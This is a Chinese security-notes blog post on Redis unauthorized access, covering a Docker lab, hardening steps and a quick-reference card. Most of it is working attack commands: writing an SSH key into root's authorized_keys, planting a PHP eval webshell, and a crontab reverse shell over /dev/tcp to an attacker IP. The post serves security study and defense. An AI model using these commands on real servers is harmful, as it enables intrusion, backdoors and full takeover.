---
title: "Redis 未授权访问"
published: 2026-09-29T23:03:00+08:00
description: "Redis 未授权访问的成因、写 crontab 与 SSH 公钥 getshell 的复现过程及加固建议。"
image: ""
tags:
  - 安全笔记
  - 中间件
category: 技术文章
draft: false
lang: zh-CN
pinned: false
comment: true
---

## 一、漏洞概述

### 1.1 原理

Redis 低版本默认情况下会开放 **6379 端口**，允许任意用户**未授权**发送 Redis 指令，无需身份认证即可访问和操作 Redis 数据库。

### 1.2 必要条件

| 条件       | 说明                                 |
| ---------- | ------------------------------------ |
| Redis 版本 | **v5.0.5 以下**（默认无密码认证）    |
| 端口开放   | 6379 端口对攻击者可达                |
| 权限       | 以 **root** 或高权限运行（危害更大） |

### 1.3 漏洞危害

| 危害           | 说明                                    |
| -------------- | --------------------------------------- |
| **信息泄露**   | 未授权访问内部数据                      |
| **数据破坏**   | 执行 `FLUSHALL` 清空所有数据            |
| **写入后门**   | 通过数据备份功能写入 Webshell、SSH 公钥 |
| **命令执行**   | 通过 `EVAL` 执行 Lua 代码               |
| **服务器控制** | 以 root 身份运行时可完全控制服务器      |

------

## 二、Redis 搭建（Docker）

```bash
# 安装 Docker
sudo apt update
sudo apt install docker.io -y

# 拉取并运行 Redis 5.0.5 容器
sudo docker run -d -p 6379:6379 --name redis redis:5.0.5
```

------

## 三、漏洞利用

### 3.1 环境拓扑

```plain
┌─────────────┐     ┌──────────────────┐
│   Kali      │────▶│  Ubuntu + Docker  │
│  (攻击机)   │     │   Redis:5.0.5     │
└─────────────┘     └──────────────────┘
```

### 3.2 利用方式一：写入 SSH 公钥（免密登录）

**原理：** 将 SSH 公钥写入 Redis，通过修改备份路径和文件名，将公钥保存到 `~/.ssh/authorized_keys`。

#### Step 1：生成 SSH 密钥对

```bash
# 在 Kali 上生成 SSH 密钥对（密码设为空）
ssh-keygen
# 一直回车即可
```

#### Step 2：准备公钥文件

```bash
# 处理公钥格式（添加换行，否则 Redis 不接受）
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > 1.txt
```

#### Step 3：写入 Redis

```bash
# 将公钥写入 Redis（key 名为 crack）
cat 1.txt | redis-cli -h 192.168.61.103 -x set crack
```

#### Step 4：查看并修改备份路径

```bash
# 连接 Redis
redis-cli -h 192.168.61.103

# 查看当前备份路径
192.168.61.103:6379> CONFIG GET dir
1) "dir"
2) "/root"

# 修改备份路径为 .ssh 目录
192.168.61.103:6379> CONFIG SET dir /root/.ssh
OK

# 设置备份文件名为 authorized_keys
192.168.61.103:6379> CONFIG SET dbfilename authorized_keys
OK

# 保存
192.168.61.103:6379> SAVE
OK

# 退出
192.168.61.103:6379> exit
```

#### Step 5：免密登录

```bash
# 使用私钥登录目标服务器
ssh -i ~/.ssh/id_rsa root@192.168.61.103
```

------

### 3.3 利用方式二：写入 Webshell

**原理：** 将 PHP 一句话木马写入 Redis，通过修改备份路径到 Web 目录，生成 Webshell 文件。

#### Step 1：连接 Redis

```bash
redis-cli -h 192.168.68.132 -p 6379
```

#### Step 2：修改备份路径到 Web 目录

```bash
# 修改备份路径为 Web 根目录
192.168.68.132:6379> CONFIG SET dir /var/www/html
OK

# 设置文件名为 shell.php
192.168.68.132:6379> CONFIG SET dbfilename shell.php
OK
```

#### Step 3：写入一句话木马

```bash
# 写入 Webshell
192.168.68.132:6379> SET x "<?php @eval(\$_POST['a'])?>"
OK
```

#### Step 4：保存并验证

```bash
# 确认配置
192.168.68.132:6379> CONFIG GET dir
1) "dir"
2) "/var/www/html"

192.168.68.132:6379> CONFIG GET dbfilename
1) "dbfilename"
2) "shell.php"

# 保存
192.168.68.132:6379> SAVE
OK

192.168.68.132:6379> exit
```

#### Step 5：访问 Webshell

```plain
http://192.168.68.132/shell.php
POST: a=phpinfo();
```

------

### 3.4 利用方式三：Crontab 反弹 Shell

**原理：** 在 Linux 的定时任务目录 `/var/spool/cron/` 中写入反弹 Shell 脚本。

#### Step 1：攻击机开启监听

```bash
nc -lvvvp 6666
```

#### Step 2：连接 Redis 并写入反弹命令

```bash
redis-cli -h 192.168.68.132 -p 6379

# 写入反弹 Shell 命令（每分钟执行一次）
192.168.68.132:6379> SET xxx "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/192.168.100.147/6666 0>&1\n\n"
OK

# 修改备份路径为 Crontab 目录
192.168.68.132:6379> CONFIG SET dir /var/spool/cron
OK

# 设置文件名
192.168.68.132:6379> CONFIG SET dbfilename root
OK

# 保存
192.168.68.132:6379> SAVE
OK
```

⚠️ **注意：** 反弹 Shell 命令中的 IP 要改为**攻击机的 IP**！

------

## 四、Redis 防御加固

### 4.1 设置访问密码（禁止未授权访问）

```bash
# 编辑 Redis 配置文件
vi /etc/redis.conf

# 找到 requirepass，取消注释并设置密码
requirepass foobared
```

**验证：**

```bash
# 连接后无法执行命令
redis-cli -h 192.168.68.132 -p 6379
192.168.68.132:6379> CONFIG GET dir
(error) NOAUTH Authentication required.

# 需要先认证
192.168.68.132:6379> AUTH foobared
OK
192.168.68.132:6379> CONFIG GET dir
1) "dir"
2) "/root"
```

### 4.2 设置访问白名单

```bash
# 编辑 Redis 配置文件
vi /etc/redis.conf

# 修改 bind，限制仅允许指定 IP 访问
bind 127.0.0.1 192.168.1.100
```

### 4.3 其他加固建议

| 措施                 | 说明                         |
| -------------------- | ---------------------------- |
| **以低权限运行**     | 不要以 root 用户运行 Redis   |
| **修改默认端口**     | 将 6379 改为其他端口         |
| **启用防火墙**       | 限制 6379 端口的访问来源     |
| **定期更新**         | 升级到最新版本，修复已知漏洞 |
| **使用非 root 用户** | 创建专用用户运行 Redis       |

------

## 五、Redis 攻击工具

| 工具                   | 地址                                           | 说明                   |
| ---------------------- | ---------------------------------------------- | ---------------------- |
| **redis-rogue-server** | https://github.com/n0b0dyCN/redis-rogue-server | Redis RCE 利用工具     |
| **redis-rce**          | https://github.com/Ridter/redis-rce            | Redis 远程命令执行工具 |

------

## 📌 快速参考卡片

### 漏洞检测

```bash
# 扫描端口
nmap -p 6379 目标IP

# 尝试未授权连接
redis-cli -h 目标IP -p 6379

# 如果可执行命令，则存在漏洞
192.168.x.x:6379> INFO
```

### 写入 SSH 公钥流程

```bash
ssh-keygen
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > 1.txt
cat 1.txt | redis-cli -h 目标IP -x set crack
redis-cli -h 目标IP
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SAVE
ssh -i id_rsa root@目标IP
```

### 写入 Webshell 流程

```bash
redis-cli -h 目标IP
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET x "<?php @eval(\$_POST['a'])?>"
SAVE
```

### 反弹 Shell 流程

```bash
# 攻击机
nc -lvvvp 6666

# Redis
SET xxx "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/攻击机IP/6666 0>&1\n\n"
CONFIG SET dir /var/spool/cron
CONFIG SET dbfilename root
SAVE
```

### 防御加固

```bash
# 设置密码
requirepass 强密码

# 限制访问 IP
bind 127.0.0.1 允许的IP

# 以非 root 用户运行
useradd redis
su - redis
```
